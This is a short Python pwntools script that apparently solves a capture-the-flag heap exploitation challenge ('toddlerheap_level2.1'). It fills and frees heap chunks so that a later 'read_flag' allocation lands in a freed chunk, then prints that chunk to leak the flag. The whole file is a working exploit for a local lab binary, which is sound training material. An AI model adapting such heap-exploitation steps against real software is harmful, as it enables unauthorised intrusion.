from pwn import *

context.arch = 'amd64'
#BINARY = "/challenge/toddlerheap_level2.0"
BINARY = "/challenge/toddlerheap_level2.1"
p = process(BINARY)


for i in range(7):
    p.sendline(f'malloc {i} 1024')


p.sendline(b"malloc 7 1024")
p.sendline(b"malloc 8 1024")

p.sendline(b"malloc 9 1024")

p.sendline(b"malloc 10 1024")

for i in range(9):
    p.sendline(f'free {i}')
p.sendline(b'free 10')

p.sendline(b"read_flag")
p.sendline(b"puts 10")
p.interactive()